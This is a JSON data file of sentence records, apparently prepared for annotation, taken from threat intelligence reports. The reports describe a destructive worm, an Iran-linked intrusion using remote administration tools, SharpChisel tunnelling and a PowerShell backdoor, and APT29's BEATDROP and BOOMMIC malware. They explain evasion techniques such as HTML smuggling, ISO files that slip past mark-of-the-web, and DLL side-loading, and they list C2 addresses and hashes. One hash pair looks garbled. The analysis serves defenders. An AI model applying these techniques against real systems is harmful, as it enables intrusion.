        "text": "Once the system is rebooted it shows a blue screen:\n",
        "type": "",
        "report": "r-961",
        "line": 54,
        "index": 2670
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S55",
        "text": "The worm component is extracted from the resources from the dropper.",
        "type": "",
        "report": "r-961",
        "line": 55,
        "index": 2671
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S56",
        "text": "Destructive malware usually uses spreading techniques to infect machines as quickly as possible.\n",
        "type": "",
        "report": "r-961",
        "line": 56,
        "index": 2672
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S57",
        "text": "The worm component can take the following names:\n",
        "type": "",
        "report": "r-961",
        "line": 57,
        "index": 2673
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S58",
        "text": "We noticed the capability to scan for the local network and connect to a potential control server:\n",
        "type": "",
        "report": "r-961",
        "line": 58,
        "index": 2674
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S59",
        "text": "Although the worm component can spread the dropper and connect to a remote server, the component was not used in this version.\n",
        "type": "",
        "report": "r-961",
        "line": 59,
        "index": 2675
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S0",
        "text": "During our research, we observed a spearphishing email allegedly from a government agency.\n",
        "type": "",
        "report": "r-992",
        "line": 0,
        "index": 2676
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S1",
        "text": "The email attempts to convince recipients to click the URL and download a malicious file.",
        "type": "",
        "report": "r-992",
        "line": 1,
        "index": 2677
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S2",
        "text": "We have seen that one of two files may be downloaded, one being a .PDF file and the other an .RTF file.\n",
        "type": "",
        "report": "r-992",
        "line": 2,
        "index": 2678
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S3",
        "text": "As with the spearphishing email, the lure documents' content attempts to convince the victim to click on another malicious URL and download a .ZIP file.",
        "type": "",
        "report": "r-992",
        "line": 3,
        "index": 2679
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S4",
        "text": "The .ZIP file contains a copy of a legitimate remote administration software developed by RemoteUtilities and provides remote administration capabilities, including:\n",
        "type": "",
        "report": "r-992",
        "line": 4,
        "index": 2680
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S5",
        "text": "- Downloading and uploading files\n",
        "type": "",
        "report": "r-992",
        "line": 5,
        "index": 2681
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S6",
        "text": "- Grabbing screenshots\n",
        "type": "",
        "report": "r-992",
        "line": 6,
        "index": 2682
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S7",
        "text": "- Browsing files and directories\n",
        "type": "",
        "report": "r-992",
        "line": 7,
        "index": 2683
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S8",
        "text": "- Executing and terminating processes\n",
        "type": "",
        "report": "r-992",
        "line": 8,
        "index": 2684
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S9",
        "text": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "type": "",
        "report": "r-992",
        "line": 9,
        "index": 2685
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S10",
        "text": "The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used.",
        "type": "",
        "report": "r-992",
        "line": 10,
        "index": 2686
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S11",
        "text": "Otherwise, the TTPs in use remain broadly similar.",
        "type": "",
        "report": "r-992",
        "line": 11,
        "index": 2687
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S12",
        "text": "When the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:\n",
        "type": "",
        "report": "r-992",
        "line": 12,
        "index": 2688
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S13",
        "text": "The MSI installer installs a service on the victim machine called Remote Utilities \u2013 Host:",
        "type": "",
        "report": "r-992",
        "line": 13,
        "index": 2689
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S14",
        "text": "The service then communicates with the domain id.remoteutilities.com, which belongs to RemoteUtilities.",
        "type": "",
        "report": "r-992",
        "line": 14,
        "index": 2690
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S15",
        "text": "This connection is related to one of its features called Internet-ID Connection.",
        "type": "",
        "report": "r-992",
        "line": 15,
        "index": 2691
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S16",
        "text": "This feature allows an intermediary Internet server to broker the connection, similar to a proxy server.",
        "type": "",
        "report": "r-992",
        "line": 16,
        "index": 2692
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S17",
        "text": "This allows the threat actor to connect to the Internet-ID server, which then connects to the actual RemoteUtilities host.",
        "type": "",
        "report": "r-992",
        "line": 17,
        "index": 2693
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S18",
        "text": "During our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software.",
        "type": "",
        "report": "r-992",
        "line": 18,
        "index": 2694
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S19",
        "text": "They were targeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a ScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)\n",
        "type": "",
        "report": "r-992",
        "line": 19,
        "index": 2695
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S20",
        "text": "As noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at instance-sy9at2-relay.screenconnect.com and resolves to 51.68.244.39.\n",
        "type": "",
        "report": "r-992",
        "line": 20,
        "index": 2696
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S21",
        "text": "The same domain was mentioned in the previous research.",
        "type": "",
        "report": "r-992",
        "line": 21,
        "index": 2697
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S22",
        "text": "We then observed the threat actors interact with the compromised host using the ScreenConnect software, executing the following commands.\n",
        "type": "",
        "report": "r-992",
        "line": 22,
        "index": 2698
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S23",
        "text": "The command above allows the attacker to get all the users from the domain controller.",
        "type": "",
        "report": "r-992",
        "line": 23,
        "index": 2699
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S24",
        "text": "The next command executed is the following:\n",
        "type": "",
        "report": "r-992",
        "line": 24,
        "index": 2700
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S25",
        "text": "This is a command to execute a PowerShell script of some kind.",
        "type": "",
        "report": "r-992",
        "line": 25,
        "index": 2701
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S26",
        "text": "However, we did not have access to the a.ps1 file.",
        "type": "",
        "report": "r-992",
        "line": 26,
        "index": 2702
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S27",
        "text": "We are not sure what functionality is provided here.\n",
        "type": "",
        "report": "r-992",
        "line": 27,
        "index": 2703
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S28",
        "text": "The next command issued is the following:\n",
        "type": "",
        "report": "r-992",
        "line": 28,
        "index": 2704
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S29",
        "text": "The command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\\programdata directory.",
        "type": "",
        "report": "r-992",
        "line": 29,
        "index": 2705
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S30",
        "text": "The name SharpChisel may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called chisel.",
        "type": "",
        "report": "r-992",
        "line": 30,
        "index": 2706
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S31",
        "text": "The above IP address is geolocated to a server in Iran.",
        "type": "",
        "report": "r-992",
        "line": 31,
        "index": 2707
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S32",
        "text": "The following command then configures SharpChisel:\n",
        "type": "",
        "report": "r-992",
        "line": 32,
        "index": 2708
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S33",
        "text": "This directs all traffic to the localhost at port 9999 to the same remote server.",
        "type": "",
        "report": "r-992",
        "line": 33,
        "index": 2709
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S34",
        "text": "Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:\n",
        "type": "",
        "report": "r-992",
        "line": 34,
        "index": 2710
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S35",
        "text": "This time, traffic will be forwarded to the server over port 443.\n",
        "type": "",
        "report": "r-992",
        "line": 35,
        "index": 2711
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S36",
        "text": "A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command:\n",
        "type": "",
        "report": "r-992",
        "line": 36,
        "index": 2712
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S37",
        "text": "It is then configured with the following command line PowerShell command:\n",
        "type": "",
        "report": "r-992",
        "line": 37,
        "index": 2713
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S38",
        "text": "We believe that the threat actor was unable to configure SharpChisel to work correctly.",
        "type": "",
        "report": "r-992",
        "line": 38,
        "index": 2714
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S39",
        "text": "The use of the following command provides additional evidence to support our assumption:\n",
        "type": "",
        "report": "r-992",
        "line": 39,
        "index": 2715
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S40",
        "text": "The command connects to the C&C server, downloads procdump64.exe, and saves the file in the C:\\programdata directory.",
        "type": "",
        "report": "r-992",
        "line": 40,
        "index": 2716
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S41",
        "text": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.\n",
        "type": "",
        "report": "r-992",
        "line": 41,
        "index": 2717
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S42",
        "text": "This was done using two separate commands:\n",
        "type": "",
        "report": "r-992",
        "line": 42,
        "index": 2718
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S43",
        "text": "We then see the threat actor again attempting to use SharpChisel several times using the following command:\n",
        "type": "",
        "report": "r-992",
        "line": 43,
        "index": 2719
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S44",
        "text": "We conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools.\n",
        "type": "",
        "report": "r-992",
        "line": 44,
        "index": 2720
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S45",
        "text": "Following the unsuccessful attempt to configure a tunnel connection to their C&C server, the threat actors downloaded a remote access tool (RAT) and attempted to configure it.",
        "type": "",
        "report": "r-992",
        "line": 45,
        "index": 2721
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S46",
        "text": "The following PowerShell command was used for this:\n",
        "type": "",
        "report": "r-992",
        "line": 46,
        "index": 2722
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S47",
        "text": "The command downloads out1.exe and saves the file in the C:\\users\\public\\ directory.",
        "type": "",
        "report": "r-992",
        "line": 47,
        "index": 2723
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S48",
        "text": "Using a UPX unpacker, we were able to extract the contents, which consists of a Python executable.",
        "type": "",
        "report": "r-992",
        "line": 48,
        "index": 2724
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S49",
        "text": "We then decompiled the python executable using pyinstxtractor.py to get all of the Python bytecode files.",
        "type": "",
        "report": "r-992",
        "line": 49,
        "index": 2725
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S50",
        "text": "These are then decompiled to get the original python code using easypythondecompiler.\n",
        "type": "",
        "report": "r-992",
        "line": 50,
        "index": 2726
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S51",
        "text": "The out1.exe RAT has the following capabilities:\n",
        "type": "",
        "report": "r-992",
        "line": 51,
        "index": 2727
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S52",
        "text": "- Data encoding\n",
        "type": "",
        "report": "r-992",
        "line": 52,
        "index": 2728
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S53",
        "text": "- Email parsing\n",
        "type": "",
        "report": "r-992",
        "line": 53,
        "index": 2729
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S54",
        "text": "- File and registry copy\n",
        "type": "",
        "report": "r-992",
        "line": 54,
        "index": 2730
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S55",
        "text": "- HTTP/S connection support\n",
        "type": "",
        "report": "r-992",
        "line": 55,
        "index": 2731
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S56",
        "text": "- Native command line\n",
        "type": "",
        "report": "r-992",
        "line": 56,
        "index": 2732
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S57",
        "text": "- Process and file execution\n",
        "type": "",
        "report": "r-992",
        "line": 57,
        "index": 2733
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S58",
        "text": "After this, the file C:\\users\\public\\Browser64.exe is run.",
        "type": "",
        "report": "r-992",
        "line": 58,
        "index": 2734
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S59",
        "text": "Browser64 is a tool that extracts credentials from the following applications: Chrome, Chromium, Firefox, Opera, Internet Explorer, Outlook\n",
        "type": "",
        "report": "r-992",
        "line": 59,
        "index": 2735
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S60",
        "text": "Following the use of browser64.exe, we observed the following command being executed:\n",
        "type": "",
        "report": "r-992",
        "line": 60,
        "index": 2736
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S61",
        "text": "They again attempted to use SharpChisel with no success:\n",
        "type": "",
        "report": "r-992",
        "line": 61,
        "index": 2737
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S62",
        "text": "Finally, we observed a persistence mechanism being set using the following commands:\n",
        "type": "",
        "report": "r-992",
        "line": 62,
        "index": 2738
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S63",
        "text": "We were able to get a copy of newsblog.js, which is a simple VBS downloader that communicates with the following URL: hxxp://23[.]95[.]215[.]100:8008/index.jsp/7e95a3d753cc4a17793ef9513e030b49/4t2Fg7k6wWRnKgd9\n",
        "type": "",
        "report": "r-992",
        "line": 63,
        "index": 2739
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S64",
        "text": "The script sets up a new HTTP object and then tries to disable the system's local proxy settings.",
        "type": "",
        "report": "r-992",
        "line": 64,
        "index": 2740
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S65",
        "text": "The script then executes an HTTP GET request to the C&C URL, grabs the server's response, and sleeps for 10 seconds.\n",
        "type": "",
        "report": "r-992",
        "line": 65,
        "index": 2741
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S66",
        "text": "At the time of our analysis, this server was still available.",
        "type": "",
        "report": "r-992",
        "line": 66,
        "index": 2742
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S67",
        "text": "The response from the server contains an encoded PowerShell script, which is executed in memory.",
        "type": "",
        "report": "r-992",
        "line": 67,
        "index": 2743
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S68",
        "text": "Decoding this script reveals that it contains a backdoor:\n",
        "type": "",
        "report": "r-992",
        "line": 68,
        "index": 2744
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S69",
        "text": "The screenshot above shows an abbreviated view of the in-memory PowerShell backdoor.",
        "type": "",
        "report": "r-992",
        "line": 69,
        "index": 2745
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S70",
        "text": "The PowerShell backdoor has the following capabilities.\n",
        "type": "",
        "report": "r-992",
        "line": 70,
        "index": 2746
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S71",
        "text": "- Check for Skype connectivity\n",
        "type": "",
        "report": "r-992",
        "line": 71,
        "index": 2747
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S72",
        "text": "- Download and install Skype\n",
        "type": "",
        "report": "r-992",
        "line": 72,
        "index": 2748
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S73",
        "text": "- Encoded communication with its C2\n",
        "type": "",
        "report": "r-992",
        "line": 73,
        "index": 2749
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S74",
        "text": "- Execute commands sent from the C2 server\n",
        "type": "",
        "report": "r-992",
        "line": 74,
        "index": 2750
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S75",
        "text": "- Get multifactor authentication settings\n",
        "type": "",
        "report": "r-992",
        "line": 75,
        "index": 2751
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S76",
        "text": "- Get the currently logged on user and OS version\n",
        "type": "",
        "report": "r-992",
        "line": 76,
        "index": 2752
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S0",
        "text": "To gain access to a victim environment, APT29 sent spear-phishing emails disguised as embassy administrative updates.",
        "type": "",
        "report": "r-1011",
        "line": 0,
        "index": 2753
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S1",
        "text": "These phishing emails used legitimate, but compromised email addresses from other diplomatic entities.",
        "type": "",
        "report": "r-1011",
        "line": 1,
        "index": 2754
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S2",
        "text": "APT29 targeted large lists of recipients that Mandiant suspected were primarily publicly listed points of contact of embassy personnel.",
        "type": "",
        "report": "r-1011",
        "line": 2,
        "index": 2755
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S3",
        "text": "These phishing emails utilized a malicious HTML dropper tracked as ROOTSAW, that makes use of a technique known as HTML smuggling to deliver an IMG or ISO file to a victim system.",
        "type": "",
        "report": "r-1011",
        "line": 3,
        "index": 2756
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S4",
        "text": "When opened, the ROOTSAW HTML dropper will write an IMG or ISO file to disk.",
        "type": "",
        "report": "r-1011",
        "line": 4,
        "index": 2757
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S5",
        "text": "On Windows 10 or later, the image file is mounted when double-clicked and the user is presented with the image file as the folder contents in Windows Explorer.",
        "type": "",
        "report": "r-1011",
        "line": 5,
        "index": 2758
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S6",
        "text": "The image file contains two additional files, a Windows shortcut (LNK) file and a malicious DLL.",
        "type": "",
        "report": "r-1011",
        "line": 6,
        "index": 2759
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S7",
        "text": "If the user clicks the LNK file, the \u201cTarget\u201d command will execute as normal.",
        "type": "",
        "report": "r-1011",
        "line": 7,
        "index": 2760
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S8",
        "text": "This mechanism lures the victim into opening the LNK file and thus inadvertently launches the malicious DLL.",
        "type": "",
        "report": "r-1011",
        "line": 8,
        "index": 2761
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S9",
        "text": "Files contained within image files, like mounted ISO files, will not contain the Zone.Identifier Alternate Data Stream (ADS) flag that indicates the files have been downloaded from the internet (so called \u201cmark-of-the-web\u201d) as reported by Didier Stevens.",
        "type": "",
        "report": "r-1011",
        "line": 9,
        "index": 2762
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S10",
        "text": "This prevents a Windows operating system warning message for files opened from ISO or IMG image files.",
        "type": "",
        "report": "r-1011",
        "line": 10,
        "index": 2763
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S11",
        "text": "The LNK utilized by APT29 in the early waves of this campaign shared multiple characteristics with those identified in campaigns from 2021, including the use of a specific icon location, as well as the machine ID and MAC address.",
        "type": "",
        "report": "r-1011",
        "line": 11,
        "index": 2764
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S12",
        "text": "One technique observed being used by APT29 was using LNK file extensions that have a different icon than the target application or document, making the shortcut appear as a document rather than a program to launch.",
        "type": "",
        "report": "r-1011",
        "line": 12,
        "index": 2765
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S13",
        "text": "This tricks the victim into opening a seemingly legitimate document.",
        "type": "",
        "report": "r-1011",
        "line": 13,
        "index": 2766
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S14",
        "text": "Shortcut files by default also have their LNK file extension hidden, even if the Windows Explorer \u201cshow file extensions\u201d is enabled, further lowering any suspicion a shortcut instead of a document is opened.\n",
        "type": "",
        "report": "r-1011",
        "line": 14,
        "index": 2767
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S15",
        "text": "The \u201cTarget\u201d in the LNK will execute the DLL with rundll32.exe and one of the DLL\u2019s exports:\n",
        "type": "",
        "report": "r-1011",
        "line": 15,
        "index": 2768
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S16",
        "text": "Mandiant also identified APT29 utilizing a malicious docx to deliver an HTA dropper, resulting in the delivery and execution of BEATDROP on a target system, in a separate but similar phishing campaign.\n",
        "type": "",
        "report": "r-1011",
        "line": 16,
        "index": 2769
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S17",
        "text": "BEATDROP is a downloader written in C that makes use of Trello for C2.",
        "type": "",
        "report": "r-1011",
        "line": 17,
        "index": 2770
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S18",
        "text": "Once executed, BEATDROP first maps its own copy of `ntdll.dll` into memory for the purpose of executing shellcode in its own process.",
        "type": "",
        "report": "r-1011",
        "line": 18,
        "index": 2771
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S19",
        "text": "BEATDROP first creates a suspended thread with RtlCreateUserThread which points to NtCreateFile .\n",
        "type": "",
        "report": "r-1011",
        "line": 19,
        "index": 2772
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S20",
        "text": "Following this, BEATDROP will enumerate the system for the username, computer name, and IP address.",
        "type": "",
        "report": "r-1011",
        "line": 20,
        "index": 2773
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S21",
        "text": "This information is used to create a victim ID, which is used by BEATDROP to store and retrieve victim payloads from its C2.",
        "type": "",
        "report": "r-1011",
        "line": 21,
        "index": 2774
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S22",
        "text": "Once the victim ID is created, BEATDROP will make an initial request to Trello to identify whether the current victim has already been compromised.",
        "type": "",
        "report": "r-1011",
        "line": 22,
        "index": 2775
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S23",
        "text": "The process to identify whether the victim is already compromised begins with a GET request to retrieve the user ID from the following URL:\n",
        "type": "",
        "report": "r-1011",
        "line": 23,
        "index": 2776
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S24",
        "text": "BEATDROP then uses the user ID received from the URL in Figure 9 to list the boards related to the user, which contain all current victims.",
        "type": "",
        "report": "r-1011",
        "line": 24,
        "index": 2777
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S25",
        "text": "BEATDROP enumerates the victim boards to identify if the current target exists in the database or not.",
        "type": "",
        "report": "r-1011",
        "line": 25,
        "index": 2778
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S26",
        "text": "If the current victim does not, BEATDROP crafts a POST request to add the victim to the database using the data enumerated from the host.\n",
        "type": "",
        "report": "r-1011",
        "line": 26,
        "index": 2779
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S27",
        "text": "Once the victim is either identified or added to the database, BEATDROP will send a request to gather the victim board for the current target:\n",
        "type": "",
        "report": "r-1011",
        "line": 27,
        "index": 2780
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S28",
        "text": "BEATDROP will then enumerate the response to determine if a payload exists for the current victim.",
        "type": "",
        "report": "r-1011",
        "line": 28,
        "index": 2781
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S29",
        "text": "If one does, BEATDROP will then send a request to determine the URL to retrieve the final payload.",
        "type": "",
        "report": "r-1011",
        "line": 29,
        "index": 2782
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S30",
        "text": "The final URL will deliver the payload AES encrypted as its response.\n",
        "type": "",
        "report": "r-1011",
        "line": 30,
        "index": 2783
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S31",
        "text": "For most of the aforementioned requests to the Trello API the key and token inserted as URL parameters is enough to retrieve the information from the Trello API.",
        "type": "",
        "report": "r-1011",
        "line": 31,
        "index": 2784
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S32",
        "text": "In the case of using the download API however, Trello requires the use of a header which is also embedded in the BEATDROP samples:\n",
        "type": "",
        "report": "r-1011",
        "line": 32,
        "index": 2785
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S33",
        "text": "Analysis of early BEATDROP samples identified the malware utilized an interesting User Agent when communicating with its C2.",
        "type": "",
        "report": "r-1011",
        "line": 33,
        "index": 2786
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S34",
        "text": "The initial User Agent string was related to Apple iPads, however Mandiant observed a shift in TTPs in later BEATDROP samples to utilizing more commonly observed Windows User Agent strings.",
        "type": "",
        "report": "r-1011",
        "line": 34,
        "index": 2787
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S35",
        "text": "BEATDROP is an ideal example of APT29\u2019s continued efforts to obfuscate its activity and maintain persistent access.",
        "type": "",
        "report": "r-1011",
        "line": 35,
        "index": 2788
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S36",
        "text": "Following multiple waves of phishing utilizing BEATDROP to target diplomatic entities, Mandiant along with other researchers identified APT29 moving away from BEATDROP to a novel C++ BEACON loader in their latest campaigns against diplomatic entities.",
        "type": "",
        "report": "r-1011",
        "line": 36,
        "index": 2789
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S37",
        "text": "Several scenarios could explain this shift in tooling including the possibility that BEATDROP was no longer providing value to the group in terms of capability, or reflective of operational TTPs to periodically retool for the purposes of evading detection.",
        "type": "",
        "report": "r-1011",
        "line": 37,
        "index": 2790
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S38",
        "text": "Following the successful deployment of BEATDROP to deliver and execute a payload, APT29 was observed leveraging BOOMMIC to further establish a foothold within the environment.",
        "type": "",
        "report": "r-1011",
        "line": 38,
        "index": 2791
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S39",
        "text": "BOOMMIC, also known as VaporRage by Microsoft, is a shellcode downloader written in C that communicates over HTTP to co-opted infrastructure used for C2.",
        "type": "",
        "report": "r-1011",
        "line": 39,
        "index": 2792
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S40",
        "text": "APT29 executed BOOMMIC through DLL Side Loading of a modified version.dll by a legitimate Java binary, jucheck.exe.\n",
        "type": "",
        "report": "r-1011",
        "line": 40,
        "index": 2793
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S41",
        "text": "APT29 first deployed BOOMMIC within minutes following the successful execution of BEATDROP.",
        "type": "",
        "report": "r-1011",
        "line": 41,
        "index": 2794
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S42",
        "text": "The group deployed the malicious BOOMMIC DLL javafx_font.dll (363a95777f401df40db61148593ea387) alongside two additional files:\n",
        "type": "",
        "report": "r-1011",
        "line": 42,
        "index": 2795
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S43",
        "text": "Prior to executing BOOMMIC APT29 was observed creating persistence via a registry key for \u201cJava Update\u201d that would execute jucheck.exe from the directory that contained version.dll and the BOOMMIC payload.",
        "type": "",
        "report": "r-1011",
        "line": 43,
        "index": 2796
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S44",
        "text": "APT29 then executed jucheck.exe via wmic which then loaded and executed BOOMMIC based on DLL Side Loading.\n",
        "type": "",
        "report": "r-1011",
        "line": 44,
        "index": 2797
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S45",
        "text": "Version.dll and jucheck.exe are both important pieces of the execution chain used to launch BOOMMIC.",
        "type": "",
        "report": "r-1011",
        "line": 45,
        "index": 2798
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S46",
        "text": "Jucheck.exe is a legitimate java binary used to check for any updates.",
        "type": "",
        "report": "r-1011",
        "line": 46,
        "index": 2799
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S47",
        "text": "This file will load version.dll upon its execution.",
        "type": "",
        "report": "r-1011",
        "line": 47,
        "index": 2800
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S48",
        "text": "Version.dll is an unsigned and modified copy of a signed legitimate Windows DLL, normally found under %SYSTEMROOT%\\System32, but retains its PE header.",
        "type": "",
        "report": "r-1011",
        "line": 48,
        "index": 2801
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S49",
        "text": "An additional import was added to the modified version.dll, which imports the malicious function from javafx_font.dll.\n",
        "type": "",
        "report": "r-1011",
        "line": 49,
        "index": 2802
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S50",
        "text": "When version.dll imports BOOMMIC, it also executes BOOMIC\u2019s DllMain function, which can be seen in Figure 22.\n",
        "type": "",
        "report": "r-1011",
        "line": 50,
        "index": 2803
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S51",
        "text": "Without the modified version.dll present within its directory being launched, executing jucheck.exe will not result in BOOMMIC running.\n",
        "type": "",
        "report": "r-1011",
        "line": 51,
        "index": 2804
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S52",
        "text": "BOOMMIC, similar to previous reporting by Microsoft on VaporRage, contains multiple export functions.",
        "type": "",
        "report": "r-1011",
        "line": 52,
        "index": 2805
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S53",
        "text": "In the case of 363a95777f401df40db61148593ea387, the export function that contains the primary functionality of BOOMMIC is Java_com_sun_javafx_font_PrismFontFactory_getLCDContrastWin32.\n",
        "type": "",
        "report": "r-1011",
        "line": 53,
        "index": 2806
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S54",
        "text": "The primary function of BOOMMIC is to download and load shellcode payloads into memory on a target.",
        "type": "",
        "report": "r-1011",
        "line": 54,
        "index": 2807
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S55",
        "text": "Once executed, BOOMMIC first checks if it is running under the process jucheck.exe, if it is not the program will exit.",
